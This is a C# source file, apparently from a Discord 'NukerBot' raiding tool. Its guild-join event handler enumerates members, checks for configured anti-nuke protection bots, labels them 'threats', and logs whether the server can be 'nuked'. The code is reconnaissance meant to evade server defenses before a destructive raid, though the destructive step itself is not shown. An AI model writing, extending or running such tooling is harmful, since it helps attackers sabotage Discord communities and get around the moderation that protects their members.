using DSharpPlus;
using DSharpPlus.CommandsNext;
using DSharpPlus.EventArgs;
using Microsoft.Extensions.DependencyInjection;
using NukerBot.src.Core.Entities;

namespace NukerBot.src.Core.Events;

[DiscordEvent]
public static class GuildCreated
{
    public static async Task MainAsync(DiscordClient client, GuildCreateEventArgs args)
    {
        var commandsNext = client.GetCommandsNext();
        var config = commandsNext.Services.GetRequiredService<Config>();

        var guild = args.Guild;

        var members = await guild.GetAllMembersAsync();
        var myRole = guild.CurrentMember.Roles.FirstOrDefault();

        var foundThreats = new List<Tuple<string, ulong, List<string>>>();

        // anti-nuke bot detection

        var protectionBots = config.Nuking.Options.ProtectionBots;

        var tasks = protectionBots
            .Select(async bot =>
            {
                try
                {
                    var member = members.FirstOrDefault(m => m.Id == bot.ID);
                    return member ?? await ProtectionBot.ToDiscordMemberAsync(bot, guild);
                }
                catch
                {
                    return null;
                }
            })
            .ToList();

        var foundBots = await Task.WhenAll(tasks);

        foreach (var (bot, member) in protectionBots.Zip(foundBots, (bot, member) => (bot, member)))
        {
            if (member != null)
            {
                foundThreats.Add(new Tuple<string, ulong, List<string>>(bot.Name, bot.ID, bot.Aliases));
            }
        }

        if (foundThreats.Count > 0)
        {
            Console.WriteLine($"I found {foundThreats.Count} threats in {guild.Name}. We can't nuke this server");
        }
        else
        {
            Console.WriteLine($"I found {foundThreats.Count} threats in {guild.Name}. We can nuke this server");
        }

        await Task.CompletedTask;
    }
}
